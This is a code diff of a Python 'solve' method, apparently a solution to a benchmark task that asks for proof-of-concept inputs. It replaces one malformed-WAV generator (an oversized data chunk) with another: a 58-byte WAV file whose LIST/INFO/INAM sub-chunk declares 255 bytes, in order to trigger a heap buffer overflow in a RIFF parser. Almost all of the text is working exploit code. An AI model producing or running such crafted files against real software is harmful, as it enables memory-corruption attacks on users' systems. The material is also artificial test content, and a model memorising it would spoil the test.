@@ -2,41 +2,35 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
-        Target: Heap Buffer Overflow due to missing check of data size against RIFF chunk end.
-        We construct a WAV file where the RIFF header specifies a small size (consistent with file),
-        but an internal 'data' chunk specifies a very large size.
-        """
-        
+        # The vulnerability is a heap buffer overflow (or over-read) in a RIFF parser.
+        # It typically occurs when a sub-chunk's size exceeds the remaining data in the 
+        # parent chunk (e.g., a LIST chunk), and the parser fails to validate this boundary.
+        # We construct a 58-byte WAV file with a LIST chunk that contains an INFO sub-chunk
+        # with a declared size larger than the available data.
+
         # 1. RIFF Header (12 bytes)
-        # 'RIFF' signature
-        riff_sig = b'RIFF'
-        # RIFF chunk size: 50 bytes (Total file size 58 - 8 bytes header)
-        # This allocates a buffer of roughly this size in memory.
-        riff_size = struct.pack('<I', 50)
-        # 'WAVE' format
-        wave_sig = b'WAVE'
+        # File size: 58 bytes. RIFF Chunk Size = 58 - 8 = 50.
+        riff_header = b'RIFF' + struct.pack('<I', 50) + b'WAVE'
+
+        # 2. LIST Chunk Header (8 bytes)
+        # We set the LIST chunk size to 38, which consumes the rest of the file.
+        # 58 (total) - 12 (RIFF) - 8 (LIST header) = 38 bytes.
+        list_header = b'LIST' + struct.pack('<I', 38)
+
+        # 3. LIST Chunk Payload (38 bytes)
+        # The payload contains the type 'INFO', followed by a sub-chunk 'INAM'.
+        # 'INFO' takes 4 bytes.
+        # 'INAM' header takes 8 bytes (4 ID + 4 Size).
+        # This leaves 38 - 4 - 8 = 26 bytes for the 'INAM' data.
         
-        # 2. fmt Chunk (24 bytes)
-        # 'fmt ' signature
-        fmt_sig = b'fmt '
-        # Chunk size: 16 bytes for standard PCM
-        fmt_len = struct.pack('<I', 16)
-        # PCM Format (1), 1 Channel, 44100 Hz, 44100 ByteRate, 1 BlockAlign, 8 BitsPerSample
-        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 44100, 1, 8)
+        # To trigger the vulnerability, we set the 'INAM' size to be larger than 26.
+        # We use 255 (0xFF).
         
-        # 3. data Chunk Header (8 bytes)
-        # 'data' signature
-        data_sig = b'data'
-        # Chunk size: Set to a large value (0x7FFFFFFF) to trigger the overflow.
-        # The parser will attempt to read this many bytes, but the buffer/file ends much sooner.
-        # The vulnerability is that this size is not checked against the containing RIFF chunk size (50).
-        data_len = struct.pack('<I', 0x7FFFFFFF)
+        list_type = b'INFO'
+        sub_chunk_id = b'INAM'
+        sub_chunk_size = struct.pack('<I', 255) # Malformed size triggering overflow
         
-        # 4. Payload (14 bytes)
-        # Fill the remaining bytes to reach the ground-truth length of 58 bytes.
-        # (12 + 24 + 8 = 44 bytes used so far. 58 - 44 = 14 bytes remaining)
-        payload = b'\x00' * 14
-        
-        return riff_sig + riff_size + wave_sig + fmt_sig + fmt_len + fmt_data + data_sig + data_len + payload
+        # We fill the actual 26 bytes of available space with padding.
+        padding = b'A' * 26
+
+        return riff_header + list_header + list_type + sub_chunk_id + sub_chunk_size + padding
